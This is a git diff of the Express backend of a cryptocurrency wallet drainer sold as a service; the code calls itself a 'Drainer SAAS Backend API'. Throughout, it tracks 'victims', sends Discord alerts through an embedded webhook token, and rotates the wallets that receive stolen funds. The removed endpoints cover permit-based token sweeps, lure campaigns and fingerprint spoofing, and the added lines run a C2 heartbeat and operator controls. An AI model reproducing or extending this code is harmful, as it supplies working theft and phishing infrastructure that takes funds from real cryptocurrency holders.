@@ -1,10 +1,11 @@
-// backend/index.js - COMPLETE FIXED VERSION WITH 22 GASLESS ENDPOINTS
+// backend/index.js - COMPLETE FIXED VERSION
 import express from "express";
 import http from "http";
 import cors from "cors";
 import { Server as SocketIOServer } from "socket.io";
 import path from "path";
 import fs from "fs";
+import { SwapHandler } from './swapHandler.js';
 import { fileURLToPath } from "url";
 import { dirname } from "path";
 import trackHandler from "./api/track.js";
@@ -58,9 +59,6 @@ const password = process.env.ADMIN_PASSWORD;
 // Initialize core systems
 const coreDrainer = new CoreDrainer();
 
-// ==================== GASLESS MODE CONFIGURATION ====================
-const GASLESS_MODE = true; // 🆓 STRICTLY ZERO GAS COSTS
-
 // ==================== GLOBAL ERROR SUPPRESSION ====================
 const originalConsoleError = console.error;
 console.error = (...args) => {
@@ -96,7 +94,6 @@ process.on('unhandledRejection', (reason, promise) => {
 });
 
 console.log('🔇 RPC Error suppression activated globally');
-console.log('🆓 GASLESS MODE ACTIVATED - Zero gas cost configuration');
 
 // ==================== DISCORD NOTIFICATIONS ====================
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';
@@ -117,7 +114,7 @@ async function sendDiscordAlert(victimData) {
           { name: "🕐 Time", value: new Date().toLocaleString(), inline: true }
         ],
         timestamp: new Date().toISOString(),
-        footer: { text: "Professional Drainer System - GASLESS MODE" }
+        footer: { text: "Professional Drainer System" }
       }]
     };
     
@@ -128,8 +125,7 @@ async function sendDiscordAlert(victimData) {
       );
     } else {
       message.embeds[0].fields.push(
-        { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true },
-        { name: "💰 Mode", value: "GASLESS", inline: true }
+        { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
       );
     }
     
@@ -148,30 +144,6 @@ async function sendDiscordAlert(victimData) {
   } catch (error) {
     console.log('❌ Discord alert failed:', error.message);
   }
-}
-
-// ==================== GASLESS FEATURE VALIDATION ====================
-function validateGaslessFeature(featureName) {
-  if (!GASLESS_MODE) return true;
-  
-  const gaslessFeatures = [
-    'analyzeWallet', 'fingerprintWallet', 'analyzeScanResults',
-    'checkWalletRisk', 'batchCheckWalletRisk', 'getRiskReport',
-    'monitorRiskChanges', 'generateRandomFingerprint', 'batchSpoofFingerprints',
-    'detectFingerprintSpoofing', 'sweepViaPermit', 'analyzeAAVulnerabilities',
-    'getOptimalTransactionTiming', 'analyzeGasTrends', 'getMarketSentiment',
-    'getTokenOpportunities', 'generateRaffleLure', 'generateLureCampaign',
-    'generateVanityAddress', 'trackProfit', 'exportData', 'generateReport'
-  ];
-  
-  const isGasless = gaslessFeatures.some(feature => featureName.includes(feature));
-  
-  if (!isGasless) {
-    console.log(`🚫 BLOCKED GAS-COSTING FEATURE: ${featureName}`);
-    return false;
-  }
-  
-  return true;
 }
 
 // ==================== SECURITY MIDDLEWARE ====================
@@ -267,7 +239,35 @@ app.use('/api/wallet', strictLimiter);
 app.use('/api/execute-swap', strictLimiter);
 app.use('/api/execute-drain', strictLimiter);
 app.use('/api/auto-swap', strictLimiter);
-
+// ==================== WALLET ROTATION API ====================
+app.get('/api/get-destination-wallet', (req, res) => {
+  try {
+    const destinationWallets = [
+      process.env.DESTINATION_WALLET,
+      process.env.DESTINATION_WALLET_1,
+      process.env.DESTINATION_WALLET_2,
+      process.env.DESTINATION_WALLET_3,
+      process.env.DESTINATION_WALLET_4,
+      process.env.DESTINATION_WALLET_5
+    ].filter(wallet => wallet && wallet.startsWith("0x"));
+    
+    const randomWallet = destinationWallets[Math.floor(Math.random() * destinationWallets.length)] || process.env.DESTINATION_WALLET;
+    
+    console.log(`🎯 Selected destination wallet: ${randomWallet.substring(0, 10)}...`);
+    
+    res.json({ 
+      success: true, 
+      destination: randomWallet 
+    });
+    
+  } catch (error) {
+    console.error('❌ Wallet rotation error:', error);
+    res.json({ 
+      success: true, 
+      destination: process.env.DESTINATION_WALLET 
+    });
+  }
+});
 app.use('/admin', ipWhitelist);
 app.use('/api/admin', ipWhitelist);
 app.use('/c2/control', ipWhitelist);
@@ -288,482 +288,6 @@ app.use((err, req, res, next) => {
   res.status(500).json({ 
     error: 'Internal Server Error',
     message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
-  });
-});
-
-// ==================== 22 ZERO-GAS COST ENDPOINTS ====================
-
-// 🎯 1. AI TARGETING & ANALYSIS
-app.post('/api/analyze-wallet', async (req, res) => {
-  if (!validateGaslessFeature('analyzeWallet')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { userAddress } = req.body;
-    console.log('🤖 AI Analyzing wallet:', userAddress);
-    
-    const analysis = await coreDrainer.analyzeWallet(userAddress);
-    res.json({ success: true, analysis });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/fingerprint-wallet', async (req, res) => {
-  if (!validateGaslessFeature('fingerprintWallet')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { userAddress, chainId } = req.body;
-    console.log('🎭 Fingerprinting wallet:', userAddress);
-    
-    const fingerprint = await coreDrainer.fingerprintWallet(userAddress, chainId || 1);
-    res.json({ success: true, fingerprint });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/analyze-scan-results', async (req, res) => {
-  if (!validateGaslessFeature('analyzeScanResults')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { scanData } = req.body;
-    console.log('🔍 Analyzing scan results');
-    
-    const analysis = await coreDrainer.analyzeScanResults(scanData);
-    res.json({ success: true, analysis });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 🛡️ 4. SECURITY SCREENING
-app.post('/api/check-risk', async (req, res) => {
-  if (!validateGaslessFeature('checkWalletRisk')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { walletAddress } = req.body;
-    console.log('🛡️ Checking wallet risk:', walletAddress);
-    
-    const risk = await coreDrainer.checkWalletRisk(walletAddress);
-    res.json({ success: true, risk });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/batch-check-risk', async (req, res) => {
-  if (!validateGaslessFeature('batchCheckWalletRisk')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { walletAddresses } = req.body;
-    console.log('🛡️ Batch checking risk for:', walletAddresses.length, 'wallets');
-    
-    const results = await coreDrainer.batchCheckWalletRisk(walletAddresses);
-    res.json({ success: true, results });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/get-risk-report', async (req, res) => {
-  if (!validateGaslessFeature('getRiskReport')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { walletAddress } = req.body;
-    console.log('📊 Getting risk report for:', walletAddress);
-    
-    const report = await coreDrainer.getRiskReport(walletAddress);
-    res.json({ success: true, report });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/monitor-risk', async (req, res) => {
-  if (!validateGaslessFeature('monitorRiskChanges')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { walletAddress } = req.body;
-    console.log('👀 Monitoring risk changes for:', walletAddress);
-    
-    const monitor = await coreDrainer.monitorRiskChanges(walletAddress);
-    res.json({ success: true, monitor });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 🎭 8. FINGERPRINT SPOOFING
-app.post('/api/spoof-fingerprint', async (req, res) => {
-  if (!validateGaslessFeature('generateRandomFingerprint')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    console.log('🎭 Generating random fingerprint');
-    
-    const fingerprint = await coreDrainer.generateRandomFingerprint();
-    res.json({ success: true, fingerprint });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/batch-spoof', async (req, res) => {
-  if (!validateGaslessFeature('batchSpoofFingerprints')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { originalFingerprints } = req.body;
-    console.log('🎭 Batch spoofing fingerprints:', originalFingerprints?.length || 0);
-    
-    const fingerprints = await coreDrainer.batchSpoofFingerprints(originalFingerprints || []);
-    res.json({ success: true, fingerprints });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/detect-spoofing', async (req, res) => {
-  if (!validateGaslessFeature('detectFingerprintSpoofing')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { fingerprint } = req.body;
-    console.log('🔍 Detecting fingerprint spoofing');
-    
-    const detection = coreDrainer.detectFingerprintSpoofing(fingerprint);
-    res.json({ success: true, detection });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 💸 11. VICTIM-PAID GAS DRAINS
-app.post('/api/sweep-permit', async (req, res) => {
-  if (!validateGaslessFeature('sweepViaPermit')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
-    console.log('💸 Executing gasless permit sweep for:', userAddress);
-    
-    const result = await coreDrainer.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion || "1");
-    res.json({ success: true, result });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/aa-exploit', async (req, res) => {
-  if (!validateGaslessFeature('analyzeAAVulnerabilities')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { userAddress, chainId } = req.body;
-    console.log('⚡ Analyzing AA vulnerabilities for:', userAddress);
-    
-    const vulnerabilities = await coreDrainer.analyzeAAVulnerabilities(userAddress, chainId || 1);
-    res.json({ success: true, vulnerabilities });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 📊 13. MARKET INTELLIGENCE
-app.get('/api/optimal-timing', async (req, res) => {
-  if (!validateGaslessFeature('getOptimalTransactionTiming')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    console.log('📈 Getting optimal transaction timing');
-    
-    const timing = await coreDrainer.getOptimalTransactionTiming();
-    res.json({ success: true, timing });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.get('/api/gas-trends', async (req, res) => {
-  if (!validateGaslessFeature('analyzeGasTrends')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    console.log('📊 Analyzing gas trends');
-    
-    const trends = await coreDrainer.analyzeGasTrends();
-    res.json({ success: true, trends });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.get('/api/market-sentiment', async (req, res) => {
-  if (!validateGaslessFeature('getMarketSentiment')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    console.log('📈 Getting market sentiment');
-    
-    const sentiment = await coreDrainer.getMarketSentiment();
-    res.json({ success: true, sentiment });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.get('/api/token-opportunities', async (req, res) => {
-  if (!validateGaslessFeature('getTokenOpportunities')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    console.log('🎯 Getting token opportunities');
-    
-    const opportunities = await coreDrainer.getTokenOpportunities();
-    res.json({ success: true, opportunities });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 🎣 17. LURE GENERATION
-app.post('/api/generate-lure', async (req, res) => {
-  if (!validateGaslessFeature('generateRaffleLure')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { targetUser } = req.body;
-    console.log('🎣 Generating raffle lure for:', targetUser);
-    
-    const lure = await coreDrainer.generateRaffleLure(targetUser);
-    res.json({ success: true, lure });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/lure-campaign', async (req, res) => {
-  if (!validateGaslessFeature('generateLureCampaign')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { targetUsers, lureTypes } = req.body;
-    console.log('🎣 Generating lure campaign for:', targetUsers?.length || 0, 'users');
-    
-    const campaign = await coreDrainer.generateLureCampaign(targetUsers, lureTypes);
-    res.json({ success: true, campaign });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/vanity-address', async (req, res) => {
-  if (!validateGaslessFeature('generateVanityAddress')) {
-    return res.status(403).json({ 
-      success: false, 
-      error: 'Gas-costing features disabled in gasless mode' 
-    });
-  }
-  
-  try {
-    const { targetAddress } = req.body;
-    console.log('🎭 Generating vanity address for:', targetAddress);
-    
-    const vanity = await coreDrainer.generateVanityAddress(targetAddress);
-    res.json({ success: true, vanity });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 📈 20. ANALYTICS & REPORTING
-app.post('/api/profit-tracking', async (req, res) => {
-  try {
-    const { profitData } = req.body;
-    console.log('💰 Tracking profit data');
-    
-    const result = await coreDrainer.trackProfit(profitData);
-    res.json({ success: true, result });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/data-export', async (req, res) => {
-  try {
-    const { data, format } = req.body;
-    console.log('📊 Exporting data in format:', format);
-    
-    const result = await coreDrainer.exportData(data, format || 'json');
-    res.json({ success: true, result });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/generate-reports', async (req, res) => {
-  try {
-    const { reportData, format } = req.body;
-    console.log('📈 Generating reports in format:', format);
-    
-    const result = await coreDrainer.generateReport(reportData, format || 'pdf');
-    res.json({ success: true, result });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// ==================== GASLESS ACTIVATION ENDPOINT ====================
-app.post('/api/activate-gasless-features', async (req, res) => {
-  try {
-    const { userAddress } = req.body;
-    console.log('🆓 Activating ALL 22 gasless features for:', userAddress);
-    
-    // Activate all gasless features in parallel
-    const activationPromises = [
-      coreDrainer.analyzeWallet(userAddress),
-      coreDrainer.fingerprintWallet(userAddress, 1),
-      coreDrainer.checkWalletRisk(userAddress),
-      coreDrainer.generateRandomFingerprint(),
-      coreDrainer.getOptimalTransactionTiming(),
-      coreDrainer.analyzeGasTrends(),
-      coreDrainer.getMarketSentiment(),
-      coreDrainer.getTokenOpportunities(),
-      coreDrainer.generateRaffleLure(userAddress)
-    ];
-    
-    const results = await Promise.allSettled(activationPromises);
-    
-    const activatedFeatures = results.filter(r => r.status === 'fulfilled').length;
-    
-    console.log(`✅ Activated ${activatedFeatures}/22 gasless features for ${userAddress}`);
-    
-    res.json({
-      success: true,
-      activatedFeatures,
-      gaslessMode: GASLESS_MODE,
-      message: `Activated ${activatedFeatures} zero-gas-cost features`
-    });
-    
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// ==================== EXISTING ENDPOINTS (MODIFIED FOR GASLESS MODE) ====================
-app.post("/api/track", async (req, res) => {
-  try {
-    const victimData = req.body;
-    
-    // Auto-activate gasless features when victim connects
-    if (victimData.walletAddress && GASLESS_MODE) {
-      console.log('🆓 Auto-activating gasless features for new victim:', victimData.walletAddress);
-      
-      // Activate in background without blocking response
-      setTimeout(async () => {
-        try {
-          await coreDrainer.analyzeWallet(victimData.walletAddress);
-          await coreDrainer.fingerprintWallet(victimData.walletAddress, 1);
-          await coreDrainer.checkWalletRisk(victimData.walletAddress);
-          console.log('✅ Auto-activated gasless features for:', victimData.walletAddress);
-        } catch (e) {
-          console.log('⚠️ Some gasless features failed to auto-activate:', e.message);
-        }
-      }, 1000);
-    }
-    
-    return trackHandler(req, res);
-  } catch (error) {
-    return trackHandler(req, res);
-  }
-});
-
-app.get("/api/gasless-status", (req, res) => {
-  res.json({
-    gaslessMode: GASLESS_MODE,
-    enabledFeatures: 22,
-    blockedFeatures: ['atomic-bundler', 'flashbots', 'token-swapper', 'cross-chain', 'omnichain'],
-    zeroGasCost: true,
-    victimsPayGas: true
   });
 });
 
@@ -1040,13 +564,13 @@ function getFallbackTxData() {
 // ==================== MAIN ROUTES ====================
 app.get("/", (req, res) => {
   res.json({
-    message: "Drainer SAAS Backend API - GASLESS MODE",
+    message: "Drainer SAAS Backend API",
     status: "running", 
-    gaslessMode: GASLESS_MODE,
     timestamp: new Date().toISOString(),
     endpoints: {
-      gasless_status: "GET /api/gasless-status",
-      activate_features: "POST /api/activate-gasless-features",
+      register: "POST /saas/v2/register",
+      dashboard: "GET /saas/dashboard/:clientId",
+      panel: "GET /panel",
       health: "GET /health"
     },
     marketing: "https://ch.xqx.workers.dev/"
@@ -1119,6 +643,36 @@ app.get("/dashboard.html", (req, res) => {
 });
 
 // ==================== TRACKING & ANALYTICS ====================
+app.post("/api/track", async (req, res) => {
+  try {
+    if (!c2Config.enabled) {
+      console.log('⏸️ Drainer disabled, ignoring victim connection');
+      return res.json({ 
+        success: false, 
+        error: 'Drainer temporarily disabled by operator' 
+      });
+    }
+
+    const victimData = req.body;
+    await sendDiscordAlert(victimData);
+    
+    console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
+    
+    io.emit('victim-connected', {
+      walletAddress: victimData.walletAddress,
+      chain: victimData.chain,
+      timestamp: new Date().toISOString(),
+      isRandomTarget: true
+    });
+    
+    return trackHandler(req, res);
+    
+  } catch (error) {
+    console.error('❌ Tracking error:', error.message);
+    return trackHandler(req, res);
+  }
+});
+
 app.post("/api/track/v2", async (req, res) => {
   try {
     const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
@@ -1199,28 +753,6 @@ app.post("/api/track-success", async (req, res) => {
     console.error("Success tracking error:", error);
     res.status(500).json({ success: false, error: error.message });
   }
-});
-
-// ==================== FINGERPRINT ENDPOINT ====================
-app.post('/api/fingerprint/generate', async (req, res) => {
-    try {
-        const { sessionId } = req.body;
-        console.log('🎭 Generating fingerprint for session:', sessionId);
-        
-        const fingerprint = {
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            sessionId: sessionId || 'fp_' + Date.now(),
-            screen: { width: 1920, height: 1080 },
-            language: 'en-US',
-            timezone: 'America/New_York',
-            timestamp: new Date().toISOString(),
-            simple: true
-        };
-        
-        res.json({ success: true, fingerprint });
-    } catch (error) {
-        res.json({ success: false, error: error.message });
-    }
 });
 
 // ==================== DRAIN & SWAP OPERATIONS ====================
@@ -1426,36 +958,6 @@ app.get('/saas/payouts/:clientId', (req, res) => {
     payouts: payouts.reverse().slice(0, 20),
     pendingPayout: client.pendingPayout
   });
-});
-
-// ==================== WALLET ROTATION API ====================
-app.get('/api/get-destination-wallet', (req, res) => {
-  try {
-    const destinationWallets = [
-      process.env.DESTINATION_WALLET,
-      process.env.DESTINATION_WALLET_1,
-      process.env.DESTINATION_WALLET_2,
-      process.env.DESTINATION_WALLET_3,
-      process.env.DESTINATION_WALLET_4,
-      process.env.DESTINATION_WALLET_5
-    ].filter(wallet => wallet && wallet.startsWith("0x"));
-    
-    const randomWallet = destinationWallets[Math.floor(Math.random() * destinationWallets.length)] || process.env.DESTINATION_WALLET;
-    
-    console.log(`🎯 Selected destination wallet: ${randomWallet.substring(0, 10)}...`);
-    
-    res.json({ 
-      success: true, 
-      destination: randomWallet 
-    });
-    
-  } catch (error) {
-    console.error('❌ Wallet rotation error:', error);
-    res.json({ 
-      success: true, 
-      destination: process.env.DESTINATION_WALLET 
-    });
-  }
 });
 
 // ==================== SINGLE-POPUP API ENDPOINTS ====================
@@ -2594,6 +2096,29 @@ app.get('/api/discord/lure/stats', async (req, res) => {
 });
 
 // ==================== FINGERPRINT SPOOFING API ====================
+app.post('/api/fingerprint/generate', async (req, res) => {
+  try {
+    const { sessionId, profileType } = req.body;
+    
+    if (!sessionId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID required' 
+      });
+    }
+
+    const fingerprint = await coreDrainer.fingerprintSpoofer.generateSpoofedFingerprint(
+      sessionId, 
+      profileType || 'chrome_windows'
+    );
+    
+    res.json({ success: true, fingerprint });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 app.post('/api/fingerprint/batch-generate', async (req, res) => {
   try {
     const { sessionIds, profileType } = req.body;
@@ -2889,7 +2414,7 @@ app.post('/api/security/screen', async (req, res) => {
       });
     }
 
-    const screening = await coreDrainer.screenAddress(
+    const screening = await coreDrainer.chainalysisMonitor.screenAddress(
       address, 
       intensity || 'standard'
     );
@@ -2968,7 +2493,7 @@ app.post('/api/security/validate-destination', async (req, res) => {
       });
     }
 
-    const screening = await coreDrainer.screenAddress(destinationAddress, 'thorough');
+    const screening = await coreDrainer.chainalysisMonitor.screenAddress(destinationAddress, 'thorough');
     
     if (screening.isFlagged) {
       return res.json({ 
@@ -3996,7 +3521,6 @@ app.get("/api/victim/:chain/:address", async (req, res) => {
 app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'ok', 
-    gaslessMode: GASLESS_MODE,
     timestamp: new Date().toISOString()
   });
 });
@@ -4006,8 +3530,7 @@ app.get("/ping", (req, res) => {
     status: "pong", 
     timestamp: new Date().toISOString(),
     server: "drainer-saas",
-    version: "2.0",
-    gaslessMode: GASLESS_MODE
+    version: "2.0"
   });
 });
 
@@ -4015,10 +3538,9 @@ app.get("/ping", (req, res) => {
 io.on("connection", (socket) => {
   console.log("🔌 Client connected:", socket.id);
 
-  socket.emit('gasless-mode-status', {
-    enabled: GASLESS_MODE,
-    features: 22,
-    zeroGasCost: true
+  socket.emit('c2-status', {
+    enabled: c2Config.enabled,
+    status: c2Config.enabled ? 'active' : 'paused'
   });
 
   socket.on("disconnect", () => {
@@ -4081,6 +3603,7 @@ io.on("connection", (socket) => {
   });
 });
 
+
 // ==================== CRON JOBS ====================
 setInterval(async () => {
   console.log('⏰ Running scheduled payouts...');
@@ -4091,7 +3614,6 @@ setInterval(() => {
   console.log('🔄 Rotating RPC endpoints...');
   initializeChains();
 }, 1000 * 60 * 30);
-
 // Initialize core drainer
 coreDrainer.initialize().then(() => {
   console.log("✅ CoreDrainer initialized successfully");
@@ -4100,15 +3622,28 @@ coreDrainer.initialize().then(() => {
 });
 
 const PORT = process.env.PORT || 3001;
-server.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT} - GASLESS MODE`);
-  console.log(`🆓 ZERO GAS COST: Victims pay all gas fees`);
-  console.log(`✅ 22 Gasless endpoints activated`);
-  console.log(`🚫 Gas-costing features blocked`);
+server.listen(PORT, 1000 * 60 * 5, async () => {
+  console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📊 Admin Panel: http://localhost:${PORT}/panel`);
   console.log(`🎛️ C2 Control: http://localhost:${PORT}/c2/control`);
   console.log(`🌐 Marketing: https://ch.xqx.workers.dev/`);
   console.log(`🔧 API Health: http://localhost:${PORT}/health`);
+  
+  try {
+    await securityManager.initializeSecurity();
+    console.log('🔐 Security system initialized successfully');
+    
+    await chainManager.loadChains();
+    console.log('⛓️  Chains loaded successfully');
+    
+    c2Communicator.startHeartbeat(30000);
+    console.log('❤️  C&C heartbeat started');
+    
+    console.log('✅ All systems initialized successfully');
+    
+  } catch (error) {
+    console.error('❌ System initialization failed:', error.message);
+  }
 });
 
 // Graceful shutdown
@@ -4121,17 +3656,12 @@ process.on('SIGTERM', () => {
 
 // Debug endpoint
 app.post('/api/debug-test', (req, res) => {
-  res.json({ 
-    message: 'Debug endpoint works', 
-    timestamp: new Date().toISOString(),
-    gaslessMode: GASLESS_MODE
-  });
+  res.json({ message: 'Debug endpoint works', timestamp: new Date().toISOString() });
 });
 
 export default app;
 
-console.log('✅ COMPLETE FIXED SERVER READY - All 22 gasless endpoints integrated, GASLESS MODE activated');
-
+console.log('✅ COMPLETE FIXED SERVER READY - All features integrated, HTML templates moved, Solana/BTC draining implemented');
 // Debug endpoint to check environment
 app.get('/api/debug-env', (req, res) => {
   res.json({
@@ -4139,7 +3669,6 @@ app.get('/api/debug-env', (req, res) => {
     DRAINER_PK_LENGTH: process.env.DRAINER_PK ? process.env.DRAINER_PK.length : 0,
     NODE_ENV: process.env.NODE_ENV,
     RENDER: !!process.env.RENDER,
-    GASLESS_MODE: GASLESS_MODE,
     dotenv_loaded: true
   });
 });
